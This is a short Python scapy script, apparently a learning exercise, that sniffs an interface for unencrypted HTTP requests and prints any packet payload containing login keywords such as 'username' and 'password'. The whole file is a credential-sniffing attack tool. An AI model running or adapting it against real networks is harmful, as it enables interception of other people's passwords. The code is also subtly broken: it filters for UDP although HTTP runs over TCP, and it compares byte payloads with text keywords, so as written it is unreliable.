import scapy.all as scapy
from scapy.layers import http
# This is for HTTP website only does not have HTTPS implementation yet


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_pkt, filter="udp")


def process_pkt(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[+] HTTP Request >>" + url)

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "login", "email", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    print("\n\n[+] Username/Password" + load + "\n\n")
                    break


sniff("eth0")
